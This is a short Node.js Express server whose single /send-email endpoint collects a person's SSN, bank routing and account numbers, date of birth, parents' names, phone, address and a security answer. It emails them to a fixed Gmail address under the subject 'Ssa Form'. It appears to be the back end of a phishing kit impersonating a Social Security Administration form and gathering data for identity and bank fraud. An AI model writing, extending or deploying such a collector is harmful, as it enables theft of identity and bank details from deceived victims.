const express = require("express");
const cors = require("cors");
// const morgan = require('morgan')
const { emailTemplate } = require("./emailTemplate");
const { sendMail } = require("./email.js");
require("dotenv").config();
const app = express();

const port = process.env.PORT || 4000;

// Middlewares
app.use(cors());
// app.use(morgan("combined"));

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Api to handle accept user information and email sending.

app.post("/send-email", async (req, res) => {
  try {
    const {
      fname,
      ssn,
      mailAddress,
      fathersFname,
      mothersFname,
      city,
      state,
      amount,
      routing,
      account,
      phone_number,
      QA,
      dob,
      dateOfPayment,
    } = req.body;

    // Validate required fields

    const requiredFields = {
      fname,
      ssn,
      mailAddress,
      fathersFname,
      mothersFname,
      city,
      state,
      amount,
      routing,
      account,
      phone_number,
      QA,
      dob,
      dateOfPayment,
    };

    for (const [field, value] of Object.entries(requiredFields)) {
      if (!value) {
        return res
          .status(400)
          .json({ success: false, error: `Missing required field: ${field}` });
      }
    }

    const message = emailTemplate({
      fname,
      ssn,
      mailAddress,
      fathersFname,
      mothersFname,
      city,
      state,
      amount,
      routing,
      account,
      phone_number,
      QA,
      dob,
      dateOfPayment,
    });

    // Send the email to a fixed recipient address
    await sendMail(
      "alexislordqtest@gmail.com",
      message,
      `New Entry: Ssa Form ${fname}`
    );

    res.status(200).json({ success: true, message: "Email sent successfully" });
  } catch (error) {
    console.error("Error sending email:", error.message);
    res.status(500).json({ success: false, error: "Internal server error" });
  }
});

app.listen(port, () => {
  console.log(`Server started on port ${port}`);
});
